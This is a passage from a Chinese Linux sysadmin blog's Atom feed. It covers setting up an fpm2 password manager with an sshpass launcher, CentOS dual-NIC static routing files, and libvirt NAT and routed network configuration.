noreferrer">https://linuxtoy.org/archives/interview-creater-of-systemd-and-pulseaudio-lennart.html</a></li></ul></blockquote>]]></content>
        <category label="systemd" term="systemd"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[使用fpm2来管理ssh密码]]></title>
        <id>/2013/11/12/use-fpm2-to-manage-password</id>
        <link href="https://itxx00.github.io/notes/blog/2013/11/12/use-fpm2-to-manage-password"/>
        <updated>2013-11-12T00:00:00.000Z</updated>
        <content type="html"><![CDATA[<blockquote><p>不知道有没有童鞋需要管理一堆ssh口令，5个以内靠脑子记可能是个好办法，但是如果10个100个的时候恐怕脑子记有点不太够用。</p></blockquote><ul><li>Kramdown table of contents
{:toc .toc}</li></ul><p>不知道有没有童鞋需要管理一堆ssh口令，5个以内靠脑子记可能是个好办法，但是如果10个100个的时候恐怕脑子记有点不太够用，
这个时候就需要借助外部工具来进行管理，当然你可以自己写个简单的脚本，把ssh账号密码写入一个list里面，
人懒且为了省事也可以使用一些现成的工具，下面就推荐一个图形界面的小工具给需要的童鞋：fpm2
fpm2全名Figaro's Paaword Manager 2，是一个开源软件，使用GNU General Public License Version 2 协议，这里是<a href="http://als.regnet.cz/fpm2/" target="_blank" rel="noopener noreferrer">官方地址</a>，它还有android版本的。</p><p>在fedora里面可以直接yum安装：</p><p><code>yum install fpm2</code></p><p>安装完成后第一次运行需要你输入一个密码，今后每次启动fpm2的时候就用这个密码，默认如果密码输入错误次数超过3次，则你懂的。</p><p>打开fpm2后，一看就明白如何使用，它支持ssh/web以及自定义的密码管理，可以对管理的服务器进行分类，十分方便。其亮点是你可以根据自己的需要设置launcher，默认双击建立好的口令就会自动执行launcher定义的命令；</p><p>launcher里面将保存的账号密码和IP/URL定义为参数，<code>$a ip/url</code>  ，<code>$u  username</code>  ， <code>$p  password</code>， 有了这些变量后自定义launcher就很方便了。</p><p>但是其默认的ssh的launcher是不支持直接双击list里面的项目就登陆进服务器的，这个时候需要另外一个小工具sshpass，它的用处是登陆ssh的时候可以把密码作为参数传递给ssh客户端，而不需要交互式输入密码，这个工具代码托管在sf，fedora里也可以yum安装：</p><p><code>yum install sshpass</code></p><p>光有这两个工具还不够，下面是将两个工具完美结合起来的关键：</p><p>在fpm2的settings选项卡下有launcher设置项，打开之后你会发现默认的ssh launcher，下面是我自定义的ssh的加载器命令：</p><p>配置launcher</p><p><code>gnome-terminal -e 'sh -c "'"sshpass -p '"'$p'"' ssh  -p 22 $u@$a;sudo -s"'"'</code></p><p>特别注意里面的单双引号的写法，不然如果你的密码里有像%&amp;$之类的特殊符号时是会出问题的，</p><p><code>gnome-terminal -e 'xxxxx'</code> 这里是单引号</p><p><code>sh -c "'" xxxxx "'"</code> 这里是两对双引号中包含的单引号</p><p><code>sshpass -p '"' xxx '"'</code> 这里是两对单引号包含的双引号</p><p>ssh命令后面加个sudo -s的作用是当退出ssh连接时不会立即关闭当前的terminal终端</p><p>使用这个launcher可以通杀所有特殊字符的密码，在运行fpm2+sshpass的组合前请自己使用当前运行fpm2的账户登陆ssh一下远程服务器将服务器的publickey取回来，没有key的情况下sshpass无法工作的。至少我遇到的是这样。</p>]]></content>
        <category label="fpm2" term="fpm2"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[CentOS中双网卡静态路由配置]]></title>
        <id>/2013/11/11/centos-multi-network-interface-route</id>
        <link href="https://itxx00.github.io/notes/blog/2013/11/11/centos-multi-network-interface-route"/>
        <updated>2013-11-11T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[演示如何为双网卡配置独立的路由规则]]></summary>
        <content type="html"><![CDATA[<blockquote><p> 一个网卡的话不需要静态路由的，如果多个网卡的话可以手工配置静态路由，特别是多个网卡走不同的子网的时候。</p></blockquote><ul><li>Kramdown table of contents
{:toc .toc}</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="来自网上搜索的方法">来自网上搜索的方法<a class="hash-link" href="#来自网上搜索的方法" title="标题的直接链接">​</a></h2><p>之前一直没有配置过两个网卡分别使用不同的IP，走不同的网关，google了下发现了下面的手工添加路由的脚本：</p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token shebang important">#!/bin/sh</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">ip</span><span class="token plain"> route </span><span class="token function" style="color:#d73a49">add</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">10.1</span><span class="token plain">.1.0/24 dev br0 src </span><span class="token number" style="color:#36acaa">10.1</span><span class="token plain">.1.10 table bond0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">ip</span><span class="token plain"> route </span><span class="token function" style="color:#d73a49">add</span><span class="token plain"> default via </span><span class="token number" style="color:#36acaa">10.1</span><span class="token plain">.1.1 dev br0 table bond0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">ip</span><span class="token plain"> rule </span><span class="token function" style="color:#d73a49">add</span><span class="token plain"> from </span><span class="token number" style="color:#36acaa">10.1</span><span class="token plain">.1.10/32 table bond0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">ip</span><span class="token plain"> rule </span><span class="token function" style="color:#d73a49">add</span><span class="token plain"> to </span><span class="token number" style="color:#36acaa">10.1</span><span class="token plain">.1.10/32 table bond0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">ip</span><span class="token plain"> route </span><span class="token function" style="color:#d73a49">add</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">192.168</span><span class="token plain">.1.0/24 dev br1 src </span><span class="token number" style="color:#36acaa">192.168</span><span class="token plain">.1.10 table bond1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">ip</span><span class="token plain"> route </span><span class="token function" style="color:#d73a49">add</span><span class="token plain"> default via </span><span class="token number" style="color:#36acaa">192.168</span><span class="token plain">.1.1 dev br1 table bond1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">ip</span><span class="token plain"> rule </span><span class="token function" style="color:#d73a49">add</span><span class="token plain"> from </span><span class="token number" style="color:#36acaa">192.168</span><span class="token plain">.1.10/32 table bond1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">ip</span><span class="token plain"> rule </span><span class="token function" style="color:#d73a49">add</span><span class="token plain"> to </span><span class="token number" style="color:#36acaa">192.168</span><span class="token plain">.1.10/32 table bond1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="来自红帽文档中的方法">来自红帽文档中的方法<a class="hash-link" href="#来自红帽文档中的方法" title="标题的直接链接">​</a></h2><p>后来想了想这样的问题系统肯定已经支持得很好了，只是没有找到配置方法，于是找了下红帽的文档，发现可以像下面这样配置：</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="配置静态路由">配置静态路由<a class="hash-link" href="#配置静态路由" title="标题的直接链接">​</a></h3><p> 一个网卡的话不需要静态路由的，如果多个网卡的话可以手工配置静态路由，特别是多个网卡走不同的子网的时候。</p><p><code>route -n   #查看当前路由信息</code></p><p>静态路由配置文件路径:
<code>/etc/sysconfig/network-scripts/route-interface_name</code>
就和网卡的配置文件路径结构差不多，比如ifcfg-eth0变成了route-eth0。</p><p>eth0网卡的静态路由就保存在这个文件里面。这个文件可以有两种格式</p><ul><li>IP命令参数格式</li><li>网络/掩码指令格式</li></ul><h4 class="anchor anchorWithStickyNavbar_LWe7" id="ip命令参数模式">IP命令参数模式：<a class="hash-link" href="#ip命令参数模式" title="标题的直接链接">​</a></h4><p>1）第一行定义默认路由：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">default via X.X.X.X dev interface</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>X.X.X.X 是默认路由的IP. interface是可以连接到默认路由的网卡接口名.</p><p>2）静态路由一行一个：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">X.X.X.X/X via X.X.X.X dev interface</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>X.X.X.X/X 是网络和掩码. X.X.X.X 和 interface 是各自网段的网关IP和网卡接口.</p><p>配置示例 route-eth0：
默认网关 192.168.0.1, 接口eth0. 两条静态路由到 10.10.10.0/24 和172.16.1.0/24 :</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">default via 192.168.0.1 dev eth0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">10.10.10.0/24 via 10.10.10.1 dev eth1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">172.16.1.0/24 via 192.168.0.1 dev eth0</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h4 class="anchor anchorWithStickyNavbar_LWe7" id="网络掩码指令格式">网络/掩码指令格式：<a class="hash-link" href="#网络掩码指令格式" title="标题的直接链接">​</a></h4><p>route-interface文件的第二种格式.下面是样板:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ADDRESS0=X.X.X.X</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">NETMASK0=X.X.X.X</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">GATEWAY0=X.X.X.X</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>ADDRESS0=X.X.X.X 静态路由的网络编号.
NETMASK0=X.X.X.X 为上面那行设置子网掩码 .
GATEWAY0=X.X.X.X  能够连接到 ADDRESS0=X.X.X.X 这个网络的网关</p><p>配置示例 route-eth0：
默认网关 192.168.0.1, 接口 eth0. 两条到10.10.10.0/24 和172.16.1.0/24 的静态路由：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ADDRESS0=10.10.10.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">NETMASK0=255.255.255.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">GATEWAY0=10.10.10.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ADDRESS1=172.16.1.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">NETMASK1=255.255.255.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">GATEWAY1=192.168.0.1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>ADDRESS0, ADDRESS1, ADDRESS2, 这样的编号必须是一个接一个的数字。</p>]]></content>
        <category label="centos" term="centos"/>
        <category label="route" term="route"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[libvirt中的网络管理实践]]></title>
        <id>/2013/10/01/libvirt-basic-usage</id>
        <link href="https://itxx00.github.io/notes/blog/2013/10/01/libvirt-basic-usage"/>
        <updated>2013-10-01T00:00:00.000Z</updated>
        <content type="html"><![CDATA[<blockquote><p>逐步分析libvirt中的网络管理方法及实践，分析在nat网络中遇到的问题及解决思路</p></blockquote><ul><li>Kramdown table of contents
{:toc .toc}</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="libvirt网络基本概念">libvirt网络基本概念<a class="hash-link" href="#libvirt网络基本概念" title="标题的直接链接">​</a></h2><p>libvirt默认使用了一个名为default的nat网络，这个网络默认使用virbr0作为桥接接口，使用dnsmasq来为使用nat网络的虚拟机提供dns及dhcp服务，dnsmasq生效后的配置文件默认保存在以下路径：</p><ul><li>/var/lib/libvirt/dnsmasq/default.hostsfile   mac&amp;&amp;ip绑定的配置文件</li><li>/var/lib/libvirt/dnsmasq/default.leases  dhcp分配到虚拟机的ip地址列表</li><li>/var/lib/libvirt/network/default.xml  default网络的配置文件</li></ul><p>dnsmasq服务的启动脚本在/etc/init.d/dnsmasq ，但是我们如果手动使用此脚本来启动服务将会导致dnsmasq读取其自己的配置文件来启动此服务，因此这么做是不推荐的，因为这个服务完全由libvirtd在接管，当libvirtd服务启动的时候，它会将它管理的被标记为autostart的network一并启动起来，而启动network的时候就会自动调用dnsmasq并赋予其适宜的配置文件来运行服务。</p><p>使用libvirt管理的网络都会用到dnsmasq来产生相应的配置，比如定义了一个名为route110的network，那么这个route110将使用一个新的桥接接口virbr1来接入网络，并使用dnsmasq产生名为route110.hostsfile和route110.leases的配置文件。其实这里提到的virbr0和virbr1都是libvirt产生的虚拟网卡，其作用就相当于一个虚拟交换机，为虚拟机提供网络转发服务。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="libvirt中网络的类型">libvirt中网络的类型<a class="hash-link" href="#libvirt中网络的类型" title="标题的直接链接">​</a></h2><p>首先分析一下libvirt所能提供的网络类型：isolated 和forwarding,其中，isolated意为绝对隔离的网络，也就是说处于此网络内的虚拟机对于外界是隔离的，这种模式可以用到一些特殊的场合，比如虚拟机只提供给内部使用，虚拟机只要求能相互通信而不需要与互联网通信。另外一类，forwarding，就是把虚拟机的数据forward到物理网络实现与外部网络进行通讯，其中forwarding又分为两种：nat和routed。</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="nat">nat<a class="hash-link" href="#nat" title="标题的直接链接">​</a></h3><p>就是把虚拟机的网络数据在经过物理机网络的时候进行ip伪装，这样所有虚拟机出去的网络数据都相当于是物理机出去的数据，也就是说，我们可以分配给使用nat网络的虚拟机一个内网ip，而这个内网ip的虚拟机访问出去的时候外部网络看到的是物理机的公网ip，这样做的用处就是实现多个虚拟机共享物理主机的公网ip，节省公网ip地址；如前所述，默认情况下libvirt已经提供了一个名为default的nat网络，在不需要进行任何配置的情况下使用default网络的虚拟机即可访问互联网，但是互联网却无法访问虚拟机提供的服务，这是因为default网络只对虚拟机的数据包进行了伪装，而没有进行dnat和snat。</p><p>需要注意的是libvirt所实现的这种nat网络是通过物理机的iptables规则来实现的，也即是在虚拟机数据经过nat表的postrouting链出去的时候对其进行了伪装。</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="routed">routed<a class="hash-link" href="#routed" title="标题的直接链接">​</a></h3><p>forwarding模式的另外一种，routed，就是将虚拟机的数据直接通过物理机route出去，和nat一样，也是需要一个virbr虚拟网卡接口来与外面进行通信，这种模式的不同之处在于虚拟机的数据没有经过伪装便直接交给了外部网络，也就是说，使用route模式网络的虚拟机可以使用公网ip地址，而物理机却恰恰在这个时候完全可以使用一个内网ip而不对外提供访问，这样，虚拟机的网卡仅仅把物理机当作一个route数据的工具，此模式应用的场合很多，比如需要让虚拟机运行在一个dmz网络中。但是使用route模式有诸多限制，例如物理机的网络接口不够用的情况下。</p><p>这里需要注意的是，nat模式和route模式的区别仅仅在于前者使用了iptables对虚拟机的数据包进行了伪装，而后者没有。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="自定义routed网络">自定义routed网络<a class="hash-link" href="#自定义routed网络" title="标题的直接链接">​</a></h2><p>在实际的虚拟机使用过程中，我们可能会碰到下面的情况：</p><ul><li>1 使用nat网络的虚拟机也需要对外提供服务，</li><li>2 物理机只有一个网卡和一个ip，而我们现在既需要通过这个网卡来管理虚拟机，又需要使用这个网卡来提供route网络。</li></ul><p>当然你所能碰到的问题可能千奇百怪，也可能根本没有碰到过此类bt问题。下面的内容只作为分析和解决问题的思路，不能生搬。在了解了libvirt的网络管理模式之后，就可以自己动手解决这些限制，下面重点解释第二种问题的解决方法：</p><p>首先假定route网络使用的是virbr1虚拟网卡，而虚拟机使用virbr1来为虚拟机提供服务，而我本机又有了一个br0作为em1的桥接网卡来对外提供网络服务，br0的ip是192.168.1.51</p><p>首先禁用br0：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ifdown br0</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>并配置br0的onboot为no,配置文件为<code>onboot=no</code></p><p>然后我们定义了一个名为route的网络，virbr1的ip设置为192.168.1.51 ，这样做的目的是让virbr1取代之前的br0.</p><div class="language-xml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-xml codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">network</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">name</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">route</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">name</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">uuid</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">6224b437-386b-f510-11d5-58d58b1ce87a</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">uuid</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">forward</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">mode</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">'</span><span class="token tag attr-value" style="color:#e3116c">route</span><span class="token tag attr-value punctuation" style="color:#393A34">'</span><span class="token tag punctuation" style="color:#393A34">/&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">bridge</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">name</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">'</span><span class="token tag attr-value" style="color:#e3116c">virbr1</span><span class="token tag attr-value punctuation" style="color:#393A34">'</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">stp</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">'</span><span class="token tag attr-value" style="color:#e3116c">on</span><span class="token tag attr-value punctuation" style="color:#393A34">'</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">delay</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">'</span><span class="token tag attr-value" style="color:#e3116c">0</span><span class="token tag attr-value punctuation" style="color:#393A34">'</span><span class="token tag" style="color:#00009f"> </span><span class="token tag punctuation" style="color:#393A34">/&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">mac</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">address</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">'</span><span class="token tag attr-value" style="color:#e3116c">52:54:00:C8:9F:07</span><span class="token tag attr-value punctuation" style="color:#393A34">'</span><span class="token tag punctuation" style="color:#393A34">/&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">ip</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">address</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">'</span><span class="token tag attr-value" style="color:#e3116c">192.168.1.51</span><span class="token tag attr-value punctuation" style="color:#393A34">'</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">netmask</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">'</span><span class="token tag attr-value" style="color:#e3116c">255.255.255.0</span><span class="token tag attr-value punctuation" style="color:#393A34">'</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">dhcp</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">range</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">start</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">'</span><span class="token tag attr-value" style="color:#e3116c">192.168.1.128</span><span class="token tag attr-value punctuation" style="color:#393A34">'</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">end</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">'</span><span class="token tag attr-value" style="color:#e3116c">192.168.1.254</span><span class="token tag attr-value punctuation" style="color:#393A34">'</span><span class="token tag" style="color:#00009f"> </span><span class="token tag punctuation" style="color:#393A34">/&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">dhcp</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">ip</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">network</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>接着生成并启用该网络</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">virsh net-define route.xml</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">virsh net-start route</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">virsh net-autostart route</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 